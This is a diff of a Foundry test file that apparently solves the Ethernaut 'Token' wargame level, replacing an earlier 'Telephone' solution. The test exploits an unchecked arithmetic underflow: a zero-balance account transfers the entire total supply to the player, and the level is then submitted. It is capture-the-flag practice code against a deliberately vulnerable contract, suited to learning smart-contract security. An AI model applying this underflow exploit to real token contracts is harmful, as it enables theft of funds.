@@ -1,12 +1,11 @@
-
 pragma solidity >=0.8.19;
 
 import { Test } from "forge-std/Test.sol";
-import { Telephone } from "src/Telephone/Telephone.sol";
-import { TelephoneFactory } from "src/Telephone/TelephoneFactory.sol";
+import { Token } from "src/Token/Token.sol";
+import { TokenFactory } from "src/Token/TokenFactory.sol";
 import { Ethernaut } from "src/Ethernaut.sol";
 
-contract ExploitTelephone {
+contract ExploitToken {
     address victimSC;
     address public owner;
     
@@ -22,7 +21,7 @@ contract ExploitTelephone {
     }
 }
 
-contract TelephoneTest is Test {
+contract TokenTest is Test {
     Ethernaut ethernaut;
     address me = makeAddr("me");
     
@@ -30,32 +29,28 @@ contract TelephoneTest is Test {
         ethernaut = new Ethernaut();
     }
 
-    function testTelephoneHack() external {
+    function testTokenHack() external {
         // level setup
-        TelephoneFactory factory = new TelephoneFactory();
+        TokenFactory factory = new TokenFactory();
         ethernaut.registerLevel(factory);
-
         vm.startPrank(me);
         address levelAddress = ethernaut.createLevelInstance(factory);
+        Token token = Token(payable(levelAddress));
 
-        address telephoneVictim = makeAddr("victim");
-        changePrank(telephoneVictim);
-        Telephone telephone = Telephone(payable(levelAddress));
-        changePrank(me);
-
-        // assume exploit owner is "me"
-        ExploitTelephone exploit = new ExploitTelephone(address(telephone));
-        
         // attack
-        address telephoneOwner = telephone.owner();
-        changePrank(telephoneVictim);
-        exploit.pickMe();
-        assertEq(telephone.owner(), me);
+        assertEq(token.balanceOf(me), 20);
 
-        // submission
+        address sidekick = makeAddr("sidekick");
+        vm.startPrank(sidekick);
+        // uncheckd ignore revert on overflow/underflow, so we can proceed to increase balance of recipient to an arbitrary amount 
+        token.transfer(me, token.totalSupply());        
+
         changePrank(me);
+        
+        // submission
         bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelPassed);
     }
 }
+
